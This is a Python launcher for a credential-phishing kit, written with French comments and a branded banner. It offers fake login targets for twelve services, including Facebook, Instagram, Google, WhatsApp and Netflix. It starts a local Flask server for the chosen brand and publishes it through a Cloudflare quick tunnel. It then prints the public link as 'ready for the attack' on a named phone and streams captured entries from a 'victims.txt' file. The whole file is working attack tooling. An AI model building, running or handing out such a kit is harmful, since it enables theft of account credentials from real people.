import os, subprocess, time, re, sys
from colorama import Fore, Style, init

init(autoreset=True)

def banner():
    os.system('clear')
    print(f"{Fore.RED}{Style.BRIGHT}      _   _                         ")
    print(f"{Fore.RED}{Style.BRIGHT}     | \ | | _____  ___   _ ___     ")
    print(f"{Fore.RED}{Style.BRIGHT}     |  \| |/ _ \ \/ / | | / __|    ")
    print(f"{Fore.WHITE}{Style.BRIGHT}     | |\  |  __/>  <| |_| \__ \    ")
    print(f"{Fore.WHITE}{Style.BRIGHT}     |_| \_|\___/_/\_\\__,_|___/    ")
    print(f"{Fore.CYAN}============================================")
    print(f"{Fore.YELLOW}  DEVELOPED BY: {Fore.WHITE}Med Rayen Bouazizi")
    print(f"{Fore.YELLOW}  LABS: {Fore.WHITE}Quantum Nexus Labs")
    print(f"{Fore.CYAN}============================================")

def main():
    banner()
    print(f"{Fore.GREEN}[01] Facebook    [05] Google      [09] LinkedIn")
    print(f"{Fore.GREEN}[02] Instagram   [06] Netflix     [10] FreeFire")
    print(f"{Fore.GREEN}[03] TikTok      [07] Spotify     [11] PUBG")
    print(f"{Fore.GREEN}[04] Snapchat    [08] WhatsApp    [12] X (Twitter)")
    print(f"{Fore.RED}\n[00] Quitter le système")
    
    choice = input(f"\n{Fore.WHITE}Nexus@Admin:~$ ")
    
    mapping = {
        "1":"facebook", "2":"instagram", "3":"tiktok", "4":"snapchat",
        "5":"google", "6":"netflix", "7":"spotify", "8":"whatsapp",
        "9":"linkedin", "10":"freefire", "11":"pubg", "12":"twitter"
    }
    
    if choice == "00": sys.exit()
    target = mapping.get(choice.zfill(2), "facebook")

    # Nettoyage des anciennes sessions
    subprocess.run(["pkill", "-f", "cloudflared"], stdout=subprocess.DEVNULL)
    subprocess.run(["pkill", "-f", "app.py"], stdout=subprocess.DEVNULL)

    # Lancement du serveur
    print(f"\n{Fore.BLUE}[*] Initialisation du serveur : {Fore.WHITE}{target.upper()}")
    flask_proc = subprocess.Popen(["python", "app.py", target], stdout=subprocess.DEVNULL)

    # Tunnel Cloudflared
    print(f"{Fore.BLUE}[*] Création du lien international...")
    with open("tunnel.log", "w") as log:
        cloud_proc = subprocess.Popen(["cloudflared", "tunnel", "--url", "http://127.0.0.1:5000"], stdout=log, stderr=log)

    # Extraction de l'URL
    time.sleep(10)
    url = None
    if os.path.exists("tunnel.log"):
        with open("tunnel.log", "r") as f:
            match = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", f.read())
            if match: url = match.group(0)
    
    if url:
        print(f"\n{Fore.MAGENTA}{Style.BRIGHT}🔗 LIEN GÉNÉRÉ : {Fore.WHITE}{url}")
        print(f"{Fore.YELLOW}[!] Prêt pour l'attaque sur le Huawei Y5.")
    else:
        print(f"\n{Fore.RED}[!] Erreur de tunnel. Relance le script.")
        flask_proc.terminate()
        return

    print(f"\n{Fore.WHITE}--- {Fore.GREEN}LOGS EN TEMPS RÉEL {Fore.WHITE}---")
    try:
        subprocess.run(["tail", "-f", "victims.txt"])
    except KeyboardInterrupt:
        flask_proc.terminate()
        cloud_proc.terminate()
        print(f"\n{Fore.YELLOW}[!] Session fermée par Med Rayen Bouazizi.")

if __name__ == "__main__":
    main()

